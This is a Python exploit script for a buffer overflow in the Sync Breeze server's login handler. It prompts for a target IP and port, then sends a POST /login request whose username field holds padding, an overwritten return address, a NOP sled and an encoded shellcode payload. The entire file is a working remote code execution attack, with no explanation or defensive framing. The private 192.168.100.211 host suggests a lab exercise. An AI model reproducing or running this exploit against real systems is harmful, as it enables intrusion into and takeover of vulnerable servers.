#!/usr/bin/python3

import sys,socket
from time import sleep 
print("***********SYNC_BREEZE Vulnerability***********")
sleep(0.5)
ip_address=input("Enter the IP address\n")
port_number=input("Enter Port number\n")

if (len(ip_address)<=0) or (len(port_number)<=0):
    if (len(ip_address)>0) and (len(port_number)<=0):
        print("Port number field is empty")
    elif (len(ip_address)<=0) and (len(port_number)>0):
        print("IP address field is empty")
    else:
        print("Issues with the user input")
elif (len(ip_address)>0) and (len(port_number)>0):
    print("*********************************************")

    buf =  b""
    buf += b"\xba\xce\xc0\xaf\xa0\xda\xc9\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\x9e"
    buf += b"\xce\x4d\x55\xe2\x27\x13\x96\x1a\xb8\x74\x1e\xff"
    buf += b"\x89\xb4\x44\x74\xb9\x04\x0e\xd8\x36\xee\x42\xc8"
    buf += b"\xcd\x82\x4a\xff\x66\x28\xad\xce\x77\x01\x8d\x51"
    buf += b"\xf4\x58\xc2\xb1\xc5\x92\x17\xb0\x02\xce\xda\xe0"
    buf += b"\xdb\x84\x49\x14\x6f\xd0\x51\x9f\x23\xf4\xd1\x7c"
    buf += b"\xf3\xf7\xf0\xd3\x8f\xa1\xd2\xd2\x5c\xda\x5a\xcc"
    buf += b"\x81\xe7\x15\x67\x71\x93\xa7\xa1\x4b\x5c\x0b\x8c"
    buf += b"\x63\xaf\x55\xc9\x44\x50\x20\x23\xb7\xed\x33\xf0"
    buf += b"\xc5\x29\xb1\xe2\x6e\xb9\x61\xce\x8f\x6e\xf7\x85"
    buf += b"\x9c\xdb\x73\xc1\x80\xda\x50\x7a\xbc\x57\x57\xac"
    buf += b"\x34\x23\x7c\x68\x1c\xf7\x1d\x29\xf8\x56\x21\x29"
    buf += b"\xa3\x07\x87\x22\x4e\x53\xba\x69\x07\x90\xf7\x91"
    buf += b"\xd7\xbe\x80\xe2\xe5\x61\x3b\x6c\x46\xe9\xe5\x6b"
    buf += b"\xa9\xc0\x52\xe3\x54\xeb\xa2\x2a\x93\xbf\xf2\x44"
    buf += b"\x32\xc0\x98\x94\xbb\x15\x0e\xc4\x13\xc6\xef\xb4"
    buf += b"\xd3\xb6\x87\xde\xdb\xe9\xb8\xe1\x31\x82\x53\x18"
    buf += b"\xd2\x6d\x0b\x46\xf1\x06\x4e\x86\xea\x46\xc7\x60"
    buf += b"\x7e\x77\x8e\x3b\x17\xee\x8b\xb7\x86\xef\x01\xb2"
    buf += b"\x89\x64\xa6\x43\x47\x8d\xc3\x57\x30\x7d\x9e\x05"
    buf += b"\x97\x82\x34\x21\x7b\x10\xd3\xb1\xf2\x09\x4c\xe6"
    buf += b"\x53\xff\x85\x62\x4e\xa6\x3f\x90\x93\x3e\x07\x10"
    buf += b"\x48\x83\x86\x99\x1d\xbf\xac\x89\xdb\x40\xe9\xfd"
    buf += b"\xb3\x16\xa7\xab\x75\xc1\x09\x05\x2c\xbe\xc3\xc1"
    buf += b"\xa9\x8c\xd3\x97\xb5\xd8\xa5\x77\x07\xb5\xf3\x88"
    buf += b"\xa8\x51\xf4\xf1\xd4\xc1\xfb\x28\x5d\xe1\x19\xf8"
    buf += b"\xa8\x8a\x87\x69\x11\xd7\x37\x44\x56\xee\xbb\x6c"
    buf += b"\x27\x15\xa3\x05\x22\x51\x63\xf6\x5e\xca\x06\xf8"
    buf += b"\xcd\xeb\x02"

    size=b"A" * 780 + b"\x83\x0C\x09\x10" + b"C" * 4 + b"\x90" * 8 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    buff=b"username=" +  size + b"&password=A"

    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.211\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+str(len(buff)).encode('utf-8')+b"\r\n"
    buffer+=b"Origin: http://192.168.100.211\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.211/login\r\n"
    buffer+=b"\r\n"
    buffer=buffer+buff
    s.send((buffer))
    s.close()
